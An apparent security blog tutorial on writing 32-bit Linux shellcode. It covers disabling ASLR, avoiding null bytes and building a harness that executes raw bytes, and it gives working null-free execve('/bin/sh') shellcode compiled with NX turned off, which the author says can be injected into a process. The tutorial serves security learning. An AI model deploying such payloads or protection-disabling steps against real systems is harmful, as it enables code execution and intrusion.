---
title:  "Linux shellcoding. Examples"
date:   2021-10-09 10:00:00 +0600
header:
  teaser: "/assets/images/12/2021-10-11_01-00.png"
categories: 
  - tutorial
tags:
  - asm
  - x86
  - malware
  - red team
---

﷽

Hello, cybersecurity enthusiasts and white hackers!           

![linux shellcoding](/assets/images/12/2021-10-11_01-00.png){:class="img-responsive"}          

### shellcode

Writing shellcode is an excellent way to learn more about assembly language and how a program communicates with the underlying OS.         

Why are we red teamers and penetration testers writing shellcode? Because in real cases shellcode can be a code that is injected into a running program to make it do something it was not made to do, for example buffer overflow attacks. So shellcode is generally can be used as the “payload” of an exploit.            

Why the name "shellcode"? Historically, shellcode is machine code that when executed spawns a shell.        

### testing shellcode     

When testing shellcode, it is nice to just plop it into a program and let it run. The C program below will be used to test all of our code (`run.c`):           
```cpp
/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] = "my shellcode here";

int main(int argc, char **argv) {
  int (*func)();             // function pointer
  func = (int (*)()) code;   // func points to our shellcode
  (int)(*func)();            // execute a function code[]
  // if our program returned 0 instead of 1, 
  // so our shellcode worked
  return 1;
}
```

Knowledge of C and Assembly is highly recommend. Also knowing how the stack works is a big plus. You can ofcourse try to learn what they mean from this tutorial, but it’s better to take your time to learn about these from a more in depth source.         

### disable ASLR
Address Space Layout Randomization (ASLR) is a security features used in most operating system today. ASLR randomly arranges the address spaces of processes, including stack, heap, and libraries. It provides a mechanism for making the exploitation hard to success. You can configure ASLR in Linux using the `/proc/sys/kernel/randomize_va_space` interface.

The following values are supported:
* 0 - no randomization
* 1 - conservative randomization
* 2 - full randomization

To disable ASLR, run:
```bash
echo 0 > /proc/sys/kernel/randomize_va_space
```

enable ASLR, run:
```bash
echo 2 > /proc/sys/kernel/randomize_va_space 
```

### some assembly

Firstly, let's repeat some more introductory information, please be patient.     

The x86 Intel Register Set.            

    EAX, EBX, ECX, and EDX are all 32-bit General Purpose Registers.           
    AH, BH, CH and DH access the upper 16-bits of the General Purpose Registers.       
    AL, BL, CL, and DL access the lower 8-bits of the General Purpose Registers.        
    EAX, AX, AH and AL are called the "Accumulator" registers and can be used for I/O port access, arithmetic, interrupt calls etc.  We can use these registers to implement system calls.       
    EBX, BX, BH, and BL are the "Base" registers and are used as base pointers for memory access. We will use this register to store pointers in for arguments of system calls. This register is also sometimes used to store return value from an interrupt in.            
    ECX, CX, CH, and CL are also known as the "Counter" registers.          
    EDX, DX, DH, and DL are called the "Data" registers and can be used for I/O port access, arithmetic and some interrupt calls.             


Assembly instructions. There are some instructions that are important in assembly programming:  
```nasm
mov  eax, 32       ; assign: eax = 32
xor  eax, eax      ; exclusive OR
push eax           ; push something onto the stack
pop  ebx           ; pop something from the stack (what was on the stack in a register/variable)
call mysuperfunc   ; call a function
int  0x80          ; interrupt, kernel command
```

Linux system calls. System calls are APIs for the interface between the user space and the kernel space. You can make use of Linux system calls in your assembly programs. You need to take the following steps for using Linux system calls in your program:

    Put the system call number in the EAX register.
    Store the arguments to the system call in the registers EBX, ECX, etc.
    Call the relevant interrupt (80h).
    The result is usually returned in the EAX register.

All the x86 syscalls are listed in `/usr/include/asm/unistd_32.h`.    

Example of how libc wraps syscalls:     
```cpp
/*
exit0.c - for demonstrating 
how libc wraps syscalls
*/
#include <stdlib.h>

void main() {
  exit(0);
}
```

Let's go to compile and disassembly:
```bash
gcc -masm=intel -static -m32 -o exit0 exit0.c
gdb -q ./exit0
```

![linux shellcoding](/assets/images/12/2021-10-11_12-31.png){:class="img-responsive"}    

`0xfc = exit_group()` and `0x1 = exit()`

### nullbytes

First of all, I want to draw your attention to nullbytes.      
Let's go to investigate simple program:      
```cpp
/*
meow.c - demonstrate nullbytes
*/
#include <stdio.h>
int main(void) {
    printf ("=^..^= meow \x00 meow");
    return 0;
}
```

compile and run:
```bash
gcc -m32 -w -o meow meow.c
./meow
```

![meow nullbytes](/assets/images/12/2021-10-11_02-45.png){:class="img-responsive"}  

As you can see, a nullbyte `\x00` terminated the chain of instructions. 

The exploits usually attack C code, and therefore the shell code often needs to be delivered in a NUL-terminated string. If the shell code contains NUL bytes the C code that is being exploited might ignore and drop rest of the code starting from the first zero byte.

This concerns only the machine code. If you need to call the system call with number `0xb`, then naturally you need to be able to produce the number `0xb` in the `EAX` register, but you can only use those forms of machine code that do not contain zero bytes in the machine code itself.

Let's go to compile and run two equivalent code.         
First `exit1.asm`:                   
```nasm
; just normal exit
; author @cocomelonc
; nasm -f elf32 -o exit1.o exit1.asm
; ld -m elf_i386 -o exit1 exit1.o && ./exit1
; 32-bit linux

section .data

section .bss

section .text
  global _start   ; must be declared for linker

; normal exit
_start:           ; linker entry point
  mov eax, 0      ; zero out eax
  mov eax, 1      ; sys_exit system call
  int 0x80        ; call sys_exit
```

compile and investigate `exit1.asm`:
```bash
nasm -f elf32 -o exit1.o exit1.asm
ld -m elf_i386 -o exit1 exit1.o
./exit1
objdump -M intel -d exit1
```

![exit1 with nullbytes](/assets/images/12/2021-10-11_03-11.png){:class="img-responsive"}      

as you can see we have a zero bytes in the machine code.     

Second `exit2.asm`:             
```nasm
; just normal exit
; author @cocomelonc
; nasm -f elf32 -o exit2.o exit2.asm
; ld -m elf_i386 -o exit2 exit2.o && ./exit2
; 32-bit linux

section .data

section .bss

section .text
  global _start   ; must be declared for linker

; normal exit
_start:           ; linker entry point
  xor eax, eax    ; zero out eax
  mov al, 1       ; sys_exit system call (mov eax, 1) with remove null bytes
  int 0x80        ; call sys_exit
```

compile and investigate `exit2.asm`:
```bash
nasm -f elf32 -o exit2.o exit2.asm
ld -m elf_i386 -o exit2 exit2.o
./exit2
objdump -M intel -d exit2
```

![exit2 no nullbytes](/assets/images/12/2021-10-11_03-19.png){:class="img-responsive"}      

As you can see, there are no embedded zero bytes in it.       

As I wrote earlier, the EAX register has AX, AH, and AL. AX is used to access the lower 16 bits of EAX. AL is used to access the lower 8 bits of EAX and AH is used to access the higher 8 bits. So why is this important for writing shellcode? Remember back to why null bytes are a bad thing. Using the smaller portions of a register allow us to use `mov al, 0x1` and not produce a null byte. If we would have done `mov eax, 0x1` it would have produced null bytes in our shellcode.         

Both these programs are functionally equivalent.           

### example1. normal exit

Let's begin with simplest example. Let's use our `exit.asm` code as the first example for shellcoding (`example1.asm`):
```nasm
; just normal exit
; author @cocomelonc
; nasm -f elf32 -o example1.o example1.asm
; ld -m elf_i386 -o example1 example1.o && ./example1
; 32-bit linux

section .data

section .bss

section .text
  global _start   ; must be declared for linker

; normal exit
_start:           ; linker entry point
  xor eax, eax    ; zero out eax
  mov al, 1       ; sys_exit system call (mov eax, 1) with remove null bytes
  int 0x80        ; call sys_exit
```

Notice the `al` and `XOR` trick to ensure that no NULL bytes will get into our code.  

Extract byte code:        
```bash
nasm -f elf32 -o example1.o example1.asm
ld -m elf_i386 -o example1 example1.o
objdump -M intel -d example1
```

![example1 shellcode](/assets/images/12/2021-10-11_10-50.png){:class="img-responsive"}    

Here is how it looks like in hexadecimal.         

So, the bytes we need are `31 c0 b0 01 cd 80`. Replace the code at the top (`run.c`) with:
```cpp
/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] = "\x31\xc0\xb0\x01\xcd\x80";

int main(int argc, char **argv) {
  int (*func)();             // function pointer
  func = (int (*)()) code;   // func points to our shellcode
  (int)(*func)();            // execute a function code[]
  // if our program returned 0 instead of 1, 
  // so our shellcode worked
  return 1;
}
```

Now, compile and run:
```bash
gcc -z execstack -m32 -o run run.c
./run
echo $?
```

![example1 shellcode](/assets/images/12/2021-10-11_11-01.png){:class="img-responsive"}    

> `-z execstack` Turn off the NX protection to make the stack executable

Our program returned 0 instead of 1, so our shellcode worked.     

### example2. spawning a linux shell.

Let's go to writing a simple shellcode that spawns a shell (`example2.asm`):       
```nasm
; example2.asm - spawn a linux shell.
; author @cocomelonc
; nasm -f elf32 -o example2.o example2.asm
; ld -m elf_i386 -o example2 example2.o && ./example2
; 32-bit linux

section .data
  msg: db '/bin/sh'

section .bss

section .text
  global _start   ; must be declared for linker

_start:           ; linker entry point

  ; xoring anything with itself clears itself:
  xor eax, eax    ; zero out eax
  xor ebx, ebx    ; zero out ebx
  xor ecx, ecx    ; zero out ecx
  xor edx, edx    ; zero out edx

  mov al, 0xb     ; mov eax, 11: execve
  mov ebx, msg    ; load the string pointer to ebx
  int 0x80        ; syscall

  ; normal exit
  mov al, 1       ; sys_exit system call (mov eax, 1) with remove null bytes
  xor ebx, ebx    ; no errors (mov ebx, 0)
  int 0x80        ; call sys_exit
```

To compile it use the following commands:       
```bash
nasm -f elf32 -o example2.o example2.asm
ld -m elf_i386 -o example2 example2.o
./example2
```

![example2 shellcode](/assets/images/12/2021-10-11_12-57.png){:class="img-responsive"}    

As you can see our program spawn a shell, via `execve`:

![man execve](/assets/images/12/2021-10-11_13-03.png){:class="img-responsive"}    

Note: `system("/bin/sh")` would have been a lot simpler right? Well the only problem with that approach is the fact that `system` always drops privileges. 

So, `execve` takes 3 arguments:
* The program to execute - EBX
* The arguments or `argv(null)` - ECX
* The environment or `envp(null)` - EDX

This time, we'll directly write the code without any null bytes, using the stack to store variables (`example3.asm`):
```nasm
; run /bin/sh and normal exit
; author @cocomelonc
; nasm -f elf32 -o example3.o example3.asm
; ld -m elf_i386 -o example3 example3.o && ./example3
; 32-bit linux

section .bss

section .text
  global _start   ; must be declared for linker

_start:           ; linker entry point

  ; xoring anything with itself clears itself:
  xor eax, eax    ; zero out eax
  xor ebx, ebx    ; zero out ebx
  xor ecx, ecx    ; zero out ecx
  xor edx, edx    ; zero out edx

  push eax        ; string terminator
  push 0x68732f6e ; "hs/n"
  push 0x69622f2f ; "ib//"
  mov ebx, esp    ; "//bin/sh",0 pointer is ESP
  mov al, 0xb     ; mov eax, 11: execve
  int 0x80        ; syscall

```

Now, let's assemble it and check if it properly works and does not contain any null bytes:  
```bash
nasm -f elf32 -o example3.o example3.asm
ld -m elf_i386 -o example3 example3.o
./example3
objdump -M intel -d example3
```

![execve shellcode 2](/assets/images/12/2021-10-11_13-30.png){:class="img-responsive"}    

Then, extract byte code via some bash hacking and `objdump`:
```bash
objdump -d ./example3|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```

![execve shellcode 2.1](/assets/images/12/2021-10-11_13-35.png){:class="img-responsive"}    

So, our shellcode is:       
```cpp
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80"
```

Then, replace the code at the top (`run.c`) with:     
```cpp
/*
run.c - a small skeleton program to run shellcode
*/
// bytecode here
char code[] = "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\xb0\x0b\xcd\x80";

int main(int argc, char **argv) {
  int (*func)();             // function pointer
  func = (int (*)()) code;   // func points to our shellcode
  (int)(*func)();            // execute a function code[]
  // if our program returned 0 instead of 1,
  // so our shellcode worked
  return 1;
}
```

Compile and run:
```bash
gcc -z execstack -m32 -o run run.c
./run
```

![shellcode example3 check](/assets/images/12/2021-10-11_13-51.png){:class="img-responsive"}    

As you can see, everything work perfectly. Now, you can use this shellcode and inject it into a process.    

> This is a practical case for educational purpose only. 

In the next part, I'll go to create a reverse TCP shellcode.         

[The Shellcoder's Handbook](https://www.wiley.com/en-us/The+Shellcoder%27s+Handbook%3A+Discovering+and+Exploiting+Security+Holes%2C+2nd+Edition-p-9780470080238)              
[Shellcoding in Linux by exploit-db](https://www.exploit-db.com/docs/english/21013-shellcoding-in-linux.pdf)              
[my intro to x86 assembly](/tutorial/2021/10/03/malware-analysis-1.html)          
[my nasm tutorial](/tutorial/2021/10/08/malware-analysis-2.html)           
[execve](https://man7.org/linux/man-pages/man2/execve.2.html)         
[Source code in Github](https://github.com/cocomelonc/2021-10-09-linux-shellcoding-1)         

Thanks for your time, happy hacking and good bye!    
*PS. All drawings and screenshots are mine*